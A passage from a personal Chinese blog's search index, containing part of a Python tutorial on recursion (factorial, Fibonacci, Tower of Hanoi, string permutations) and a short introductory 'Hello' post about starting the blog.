class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f(<span class="hljs-number">5</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*f(<span class="hljs-number">4</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*f(<span class="hljs-number">3</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*f(<span class="hljs-number">2</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*(<span class="hljs-number">2</span>*f(<span class="hljs-number">1</span>))))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*f(<span class="hljs-number">5</span>-<span class="hljs-number">4</span>))))<span class="hljs-comment">#上半部分为递，下半部分为归</span><br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*<span class="hljs-number">1</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*(<span class="hljs-number">2</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">6</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">24</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>则可以得出最终程序，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h4 id="举例2：斐波那契数列"><a href="#举例2：斐波那契数列" class="headerlink" title="举例2：斐波那契数列"></a>举例2：斐波那契数列</h4><p>1、1、2、3、5、8、13、21、34·······  简单点说就是第n项的值为前两项之和</p><p>首先对该数列进行分析，由于第一项和第二项没有前两项，则可以知道其值直接为1，假设f(n)为第n项的值，则可以推出下式：</p><p><img src="/2022/01/22/recursion/2.png" alt="img"></p><p>先确定函数的参数、返回值，求第n项的值，则n毫无疑问是参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> s <span class="hljs-comment"># 假设s是第n项的值</span><br></code></pre></td></tr></table></figure><p>确定终止条件，已知n=1或者n=2时，其值为1，则可以确定当n=1或者n=2时递归就可以结束了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s<span class="hljs-comment"># 假设s是第n项的值</span><br></code></pre></td></tr></table></figure><p>确定单层函数的逻辑，先假设n=3，则第三项的值<code>f(3)=f(2)+f(1)</code>，也就相当于<code>f(n)=f(n-1)+f(n-2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> f(n-<span class="hljs-number">1</span>)+f(n-<span class="hljs-number">2</span>)<span class="hljs-comment"># 完工</span><br></code></pre></td></tr></table></figure><h4 id="举例-3-汉诺塔"><a href="#举例-3-汉诺塔" class="headerlink" title="举例 3 汉诺塔"></a>举例 3 汉诺塔</h4><p>求汉诺塔的挪动顺序(不是需要挪动的次数)</p><p>具体玩法这就不啰嗦了，反正就是把一堆圆片片从一个柱子上面挪到另外一个柱子上面，唯一的要求就是小的要在大的上面。</p><p>假设圆片片的数量为n,则当n=1时，可以直接将A移动到C柱上，</p><p><img src="/2022/01/22/recursion/tower1.gif"></p><p>当n=2时，具体挪动状态如下:</p><p>A –&gt; B</p><p>A –&gt; C</p><p>B –&gt; C</p><p><img src="/2022/01/22/recursion/tower2.gif"></p><p>当n=3时</p><p>A –&gt; C</p><p>A –&gt; B</p><p>C –&gt; B</p><p>A –&gt; C</p><p>B –&gt; A</p><p>B –&gt; C</p><p>A –&gt; C</p><p><img src="/2022/01/22/recursion/tower3.gif"></p><p>不难看出，当n=2时，主要就是分三步(对圆片进行标号，从下往上，N-&gt;1)</p><p>1、1(N-1)号圆片从起始位置移动到缓冲区</p><p>2、将2(N)号圆片从起始位置移动到终点</p><p>3、最后将1(N-1)号圆片从缓冲区移动到终点</p><p>当然，在圆片数量较多时的起始位置，终点与缓冲区是相对的，并不是指定的某一个柱子，因为需要不停的交换位置，所以起始位置、缓冲区与终点可以是任何一个柱子。</p><p>先假设只有两个圆片，也就是n=2(要先将最小子问题求出)按照递归三步，首先确定参数以及返回值，n个圆片(n)，起始柱子(A)，缓冲柱子(B)，终止位置(C)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;圆片的变动情况&quot;</span>)<br></code></pre></td></tr></table></figure><p>确定终止条件，已知当只有一个圆片时，可以直接从起始位置直接到终止位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;圆片的变动情况&quot;</span>)<br></code></pre></td></tr></table></figure><p>确定单层循环的逻辑，单层的逻辑在上面已经写清楚，所以可以直接写出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># n = 2的情况下</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+B)<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>        <span class="hljs-built_in">print</span>(B +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br></code></pre></td></tr></table></figure><p>而当n=3时，就要继续调用tower()进行排列，所以可以写成如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 再假设n = 3的情况下</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        tower(n-<span class="hljs-number">1</span>,A,C,B) <span class="hljs-comment">#因为现在是将圆片从A移动到B，所以B和C调换位置</span><br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<span class="hljs-comment"># 可以假设1号圆片上面的柱子都已经移动到了缓冲区，则可以直接A-&gt;C</span><br>        tower(n-<span class="hljs-number">1</span>,B,A,C) <span class="hljs-comment"># 现在将缓冲区上的圆片移动至终点</span><br></code></pre></td></tr></table></figure><p>n&gt;1的其他情况同理</p><h4 id="举例4-字符串的全排列"><a href="#举例4-字符串的全排列" class="headerlink" title="举例4 字符串的全排列"></a>举例4 字符串的全排列</h4><p>就是将字符串中的所有字符进行排列组合，得到所有的排列组合结果，并去重</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例题</span><br><span class="hljs-comment"># 题目来源：codewars.Permutations</span><br>permutations(<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment"># [&#x27;a&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;ab&#x27;</span>); <span class="hljs-comment"># [&#x27;ab&#x27;, &#x27;ba&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;aabb&#x27;</span>); <span class="hljs-comment"># [&#x27;aabb&#x27;, &#x27;abab&#x27;, &#x27;abba&#x27;, &#x27;baab&#x27;, &#x27;baba&#x27;, &#x27;bbaa&#x27;]</span><br></code></pre></td></tr></table></figure><p>题目的意思很好理解，所以可以直接上递归</p><p>确定递归的参数及返回值，是对字符串的全排列，所以字符串一定是参数，返回值则是排列组合的结果，并且要去重，则可以用一个数组在加上set()去重即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>确定递归的结束点，由例子可知，当字符串中只有一个字母时，结果只有一个(它自己本身)，此时可以直接返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>确定单层递归逻辑，可以先假设字符串为”ab”,这个算是全排列中最小子问题了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 字符串长度为2时</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string[:i]+string[i+<span class="hljs-number">1</span>:]: <span class="hljs-comment"># 全排列的情况下,不能与自身进行排列组合</span><br>            <span class="hljs-comment"># 也就是说，在&quot;ab&quot;的情况下，选取&quot;a&quot;之后就不能再选取了，当然&quot;aab&quot;的情况下，a可以出现两次</span><br>            result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>而当字符串的长度大于2时，只需要在第二个for循环处再次调用<code>permutations()</code>,使得其对当前字符串长度小移位的字符串进行排列组合，然后返回给 j ，再与<code>string[i]</code>进行拼接，所以程序可以写成如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = []<span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> permutations(string[<span class="hljs-number">0</span>:i]+string[i+<span class="hljs-number">1</span>:]):<br>                result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>本文可能会有写错的地方，请见谅，我只是个捡垃圾，要是有好心的大哥愿意指出错误的地方，我会尽快进行修改，先感谢大哥~</p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/94748605">https://zhuanlan.zhihu.com/p/94748605</a></p><p><a href="https://www.zhihu.com/question/24385418">https://www.zhihu.com/question/24385418</a></p><p><a href="https://blog.csdn.net/u011562123/article/details/81984470">https://blog.csdn.net/u011562123/article/details/81984470</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>学习递归的一些记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello</title>
    <link href="/2022/01/20/hello/"/>
    <url>/2022/01/20/hello/</url>
    
    <content type="html"><![CDATA[<p>按照惯例，博客第一篇文章总要说讲一些奇奇怪怪的话</p><p>很早之前就有搭建博客的想法，也试过，但主要是苦于没有什么文章可发，现在想想其实是学到了什么就发什么，写的好不好其实也不是那么重要，当然，能写好的博客是最好的啦。这次搭建博客可能也是一时兴起，但希望我以后能够坚持下去，在此也立个<code>flag</code> : <strong>每周更新一篇博客</strong></p><p>搭博客是用的<code>github</code>+<code>hexo</code>，两个原因，一个没票子，另一个图省事，说白了就是又懒又想白嫖(开源精神)</p><p>学安全也断断续续的很长时间了，总是玩着玩着学一点点的，到头来一事无成，找个工作都很费劲，如果有人看到了，还请激励自己要坚持下去，玩很重要，但学习更重要。假如当初好好学习，现在也不至于混到去捡垃圾，但是没有假如，没有假如！没什么是能够不劳而获的，当然，要是特殊情况另算，对于像我这样的普通人来说，想要获得，就要付出，可能付出很多却只能收获一点点，但总比没有强哈。说实话，安全这个我很怕以后会吃不上饭，30岁之后吧，担心会吃不上饭。捡垃圾的我技术很垃圾，口才也不行，为人处世也一般般，感觉自己混不成领导，所以就很怕很怕。当然吃不上饭可能有点夸张，但确实是有一定可能的。</p><p>其实搭建博客也有好处，简单点说，把自己理解或者学习的东西表达出来，这在我看来是比自己学的更难一些，但是在写博客的过程中，会发现自己以前似懂非懂的地方可能会逐渐清晰(这也是我这几天在写下一篇博客时的体会)。</p><p>扯了一些废话，也能看，也不能看，水一下，顺道测试一下博客能不能用！</p><p>如果你看到了这些废话，并且看看也无妨，但请别喷我，谢谢啦~</p><p>最后再附张图片吧，也附上一句台词</p><blockquote><p>刈除杂草 才有新生</p></blockquote><p><img src="/2022/01/20/hello/hello.jfif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>一些废话吧</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
